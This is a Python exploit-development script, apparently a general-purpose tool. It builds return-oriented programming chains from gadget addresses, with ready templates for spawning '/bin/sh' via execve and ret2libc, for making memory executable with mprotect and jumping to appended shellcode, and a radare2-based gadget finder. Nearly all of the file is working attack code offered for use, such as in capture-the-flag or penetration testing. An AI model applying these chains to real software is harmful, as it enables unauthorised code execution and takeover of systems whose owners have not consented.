#!/usr/bin/env python3
"""xdev ROP chain builder — template for constructing ROP chains from gadget lists."""
import struct
import sys
import os


class ROPChain:
    """Build ROP chains with architecture-aware packing."""

    def __init__(self, arch="x86_64", base=0):
        """
        Args:
            arch: x86_64, x86, arm64, arm32
            base: base address offset (for ASLR-relative chains)
        """
        self.arch = arch
        self.base = base
        self.chain = []
        self.comments = []

        if arch == "x86_64":
            self.pack_fmt = "<Q"
            self.word_size = 8
        elif arch == "x86":
            self.pack_fmt = "<I"
            self.word_size = 4
        elif arch == "arm64":
            self.pack_fmt = "<Q"
            self.word_size = 8
        elif arch == "arm32":
            self.pack_fmt = "<I"
            self.word_size = 4
        else:
            raise ValueError(f"Unsupported arch: {arch}")

    def p(self, value):
        """Pack a single value."""
        return struct.pack(self.pack_fmt, (value + self.base) & ((1 << (self.word_size * 8)) - 1))

    def add(self, addr, comment=""):
        """Add a gadget address to the chain."""
        self.chain.append(addr)
        self.comments.append(comment)
        return self

    def add_raw(self, data, comment=""):
        """Add raw bytes (for string data, padding, etc.)."""
        self.chain.append(("raw", data))
        self.comments.append(comment)
        return self

    def add_padding(self, count=1, comment="padding"):
        """Add N words of padding (0x4141...)."""
        for i in range(count):
            self.chain.append(("raw", b"A" * self.word_size))
            self.comments.append(f"{comment} [{i}]")
        return self

    def build(self):
        """Build the final payload bytes."""
        payload = b""
        for entry in self.chain:
            if isinstance(entry, tuple) and entry[0] == "raw":
                payload += entry[1]
            else:
                payload += self.p(entry)
        return payload

    def dump(self):
        """Print annotated chain for debugging."""
        print(f"\n{'='*60}")
        print(f" ROP Chain ({self.arch}, base=0x{self.base:x})")
        print(f" Total: {len(self.chain)} entries, {len(self.build())} bytes")
        print(f"{'='*60}\n")
        offset = 0
        for i, (entry, comment) in enumerate(zip(self.chain, self.comments)):
            if isinstance(entry, tuple) and entry[0] == "raw":
                data_hex = entry[1].hex()[:16]
                print(f"  [{offset:4d}] {data_hex:<18s} ; {comment}")
                offset += len(entry[1])
            else:
                addr = (entry + self.base) & ((1 << (self.word_size * 8)) - 1)
                print(f"  [{offset:4d}] 0x{addr:016x} ; {comment}")
                offset += self.word_size
        print()

    def save(self, path):
        """Write payload to file."""
        payload = self.build()
        with open(path, "wb") as f:
            f.write(payload)
        print(f"[rop_builder] Saved {len(payload)} bytes to {path}")
        return path


# --- Common chain patterns ---

def execve_x64(gadgets, binsh_addr):
    """
    Build execve("/bin/sh", NULL, NULL) chain for x86_64.

    Required gadgets dict:
        pop_rdi, pop_rsi, pop_rdx, syscall
    """
    rop = ROPChain("x86_64")
    rop.add(gadgets["pop_rdi"], "pop rdi; ret")
    rop.add(binsh_addr, '-> "/bin/sh"')
    rop.add(gadgets["pop_rsi"], "pop rsi; ret")
    rop.add(0, "-> NULL (argv)")
    rop.add(gadgets["pop_rdx"], "pop rdx; ret")
    rop.add(0, "-> NULL (envp)")
    # rax = 59 (execve syscall number)
    if "pop_rax" in gadgets:
        rop.add(gadgets["pop_rax"], "pop rax; ret")
        rop.add(59, "-> 59 (SYS_execve)")
    rop.add(gadgets["syscall"], "syscall")
    return rop


def ret2libc_x64(gadgets, libc_base, offsets):
    """
    Build system("/bin/sh") chain for x86_64 with known libc.

    Required gadgets: pop_rdi, ret (for stack alignment)
    Required offsets: system, binsh
    """
    rop = ROPChain("x86_64", base=0)
    rop.add(gadgets["ret"], "ret (stack align)")
    rop.add(gadgets["pop_rdi"], "pop rdi; ret")
    rop.add(libc_base + offsets["binsh"], '-> "/bin/sh" in libc')
    rop.add(libc_base + offsets["system"], "system()")
    return rop


def mprotect_shellcode_x64(gadgets, page_addr, shellcode):
    """
    mprotect page RWX then jump to shellcode.

    Required gadgets: pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, jmp_rdi
    """
    rop = ROPChain("x86_64")
    # mprotect(page_addr, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
    rop.add(gadgets["pop_rax"], "pop rax; ret")
    rop.add(10, "-> 10 (SYS_mprotect)")
    rop.add(gadgets["pop_rdi"], "pop rdi; ret")
    rop.add(page_addr, "-> page address")
    rop.add(gadgets["pop_rsi"], "pop rsi; ret")
    rop.add(0x1000, "-> size (4096)")
    rop.add(gadgets["pop_rdx"], "pop rdx; ret")
    rop.add(7, "-> PROT_RWX (7)")
    rop.add(gadgets["syscall"], "syscall (mprotect)")
    # Jump to shellcode location
    rop.add(gadgets["pop_rdi"], "pop rdi; ret")
    rop.add(page_addr, "-> shellcode addr")
    rop.add(gadgets["jmp_rdi"], "jmp rdi")
    # Append shellcode as raw data
    rop.add_raw(shellcode, "shellcode payload")
    return rop


# --- Gadget finder helpers ---

def find_gadgets_r2(binary_path, gadgets_needed):
    """Use r2 to find gadgets. Returns dict of {name: address}."""
    import subprocess
    found = {}
    patterns = {
        "pop_rdi": "/R pop rdi",
        "pop_rsi": "/R pop rsi",
        "pop_rdx": "/R pop rdx",
        "pop_rax": "/R pop rax",
        "syscall": "/R syscall",
        "ret": "/R ret",
    }
    for name in gadgets_needed:
        if name not in patterns:
            continue
        cmd = f'r2 -q -c "aaa; {patterns[name]}" {binary_path}'
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            for line in out.stdout.strip().split("\n"):
                if "0x" in line:
                    addr = int(line.strip().split()[0], 16)
                    found[name] = addr
                    break
        except Exception:
            pass
    return found


if __name__ == "__main__":
    # Example: demonstrate chain building
    print("[rop_builder] Example: execve x86_64 chain")
    example_gadgets = {
        "pop_rdi": 0x401234,
        "pop_rsi": 0x401238,
        "pop_rdx": 0x40123c,
        "pop_rax": 0x401240,
        "syscall": 0x401244,
    }
    chain = execve_x64(example_gadgets, binsh_addr=0x402000)
    chain.dump()
    print(f"Payload size: {len(chain.build())} bytes")
